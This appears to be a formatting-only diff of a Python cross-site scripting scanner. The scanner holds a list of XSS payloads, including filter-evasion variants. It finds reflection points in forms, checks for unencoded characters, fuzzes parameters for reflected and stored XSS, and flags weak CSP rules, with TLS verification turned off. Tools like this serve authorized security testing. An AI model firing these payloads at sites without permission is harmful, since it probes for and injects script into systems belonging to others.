@@ -13,18 +13,18 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 XSS_WORDLIST = [
-    '<script>alert(document.domain)</script>',
-    '<img src=x onerror=alert(document.domain)>',
-    '<svg/onload=alert(document.domain)>',
-    '<body onload=alert(document.domain)>',
-    '<input onfocus=alert(document.domain) autofocus>',
-    '<marquee onstart=alert(document.domain)>',
-    '<details open ontoggle=alert(document.domain)>',
+    "<script>alert(document.domain)</script>",
+    "<img src=x onerror=alert(document.domain)>",
+    "<svg/onload=alert(document.domain)>",
+    "<body onload=alert(document.domain)>",
+    "<input onfocus=alert(document.domain) autofocus>",
+    "<marquee onstart=alert(document.domain)>",
+    "<details open ontoggle=alert(document.domain)>",
     '"><img src=x onerror=alert(document.domain)>',
     "'-alert(document.domain)-'",
     "\\'-alert(document.domain)//",
-    '<ScRiPt>alert(document.domain)</sCrIpT>',
-    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
+    "<ScRiPt>alert(document.domain)</sCrIpT>",
+    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
 ]
 
 
@@ -35,8 +35,9 @@ def find_reflection_points(base_url, token=None):
     reflections = []
     try:
         resp = requests.get(base_url, headers=headers, timeout=15, verify=False)
-        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
-                           resp.text, re.DOTALL | re.IGNORECASE)
+        forms = re.findall(
+            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>', resp.text, re.DOTALL | re.IGNORECASE
+        )
         for action, form_body in forms:
             inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', form_body, re.IGNORECASE)
             for inp in inputs:
@@ -56,7 +57,7 @@ def find_reflection_points(base_url, token=None):
 def test_character_encoding(url, param, token=None):
     """Test which special characters are reflected unencoded."""
     headers = {"Authorization": f"Bearer {token}"} if token else {}
-    test_string = '<>"\'&/`()'
+    test_string = "<>\"'&/`()"
     full_url = f"{url}?{param}={quote(test_string)}"
     try:
         resp = requests.get(full_url, headers=headers, timeout=10, verify=False)
@@ -77,10 +78,15 @@ def fuzz_xss_payloads(base_url, param_url, param_name, token=None, payloads=None
         try:
             resp = requests.get(url, headers=headers, timeout=10, verify=False)
             if payload in resp.text:
-                findings.append({
-                    "type": "REFLECTED_XSS", "url": param_url, "param": param_name,
-                    "payload": payload, "severity": "HIGH",
-                })
+                findings.append(
+                    {
+                        "type": "REFLECTED_XSS",
+                        "url": param_url,
+                        "param": param_name,
+                        "payload": payload,
+                        "severity": "HIGH",
+                    }
+                )
                 print(f"  [!] REFLECTED: {param_name}={payload[:40]}...")
                 break
         except requests.RequestException:
@@ -105,11 +111,16 @@ def test_stored_xss_endpoints(base_url, endpoints, token):
                     display_url = urljoin(base_url, ep["display"])
                     display_resp = requests.get(display_url, headers=headers, timeout=10, verify=False)
                     if payload in display_resp.text:
-                        findings.append({
-                            "type": "STORED_XSS", "submit": ep["submit"],
-                            "display": ep["display"], "field": ep.get("field", "body"),
-                            "payload": payload, "severity": "CRITICAL",
-                        })
+                        findings.append(
+                            {
+                                "type": "STORED_XSS",
+                                "submit": ep["submit"],
+                                "display": ep["display"],
+                                "field": ep.get("field", "body"),
+                                "payload": payload,
+                                "severity": "CRITICAL",
+                            }
+                        )
                         print(f"  [!] STORED XSS: {ep['submit']} -> {ep['display']}")
                         break
             except requests.RequestException:
@@ -144,7 +155,7 @@ def analyze_csp(base_url):
             weaknesses.append("unsafe-eval allows eval()")
         if "data:" in script_src:
             weaknesses.append("data: URIs allowed in script-src")
-        wildcard_domains = re.findall(r'\*\.\S+', script_src)
+        wildcard_domains = re.findall(r"\*\.\S+", script_src)
         if wildcard_domains:
             weaknesses.append(f"Wildcard domains: {wildcard_domains}")
 
@@ -187,11 +198,9 @@ def main():
     findings.extend(analyze_csp(args.base_url))
     reflections = find_reflection_points(args.base_url, args.token)
     for ref in reflections[:15]:
-        unencoded = test_character_encoding(
-            urljoin(args.base_url, ref["url"]), ref["param"], args.token)
+        unencoded = test_character_encoding(urljoin(args.base_url, ref["url"]), ref["param"], args.token)
         if "<" in unencoded or '"' in unencoded:
-            findings.extend(fuzz_xss_payloads(
-                args.base_url, ref["url"], ref["param"], args.token))
+            findings.extend(fuzz_xss_payloads(args.base_url, ref["url"], ref["param"], args.token))
     generate_report(findings, args.output)
 
 
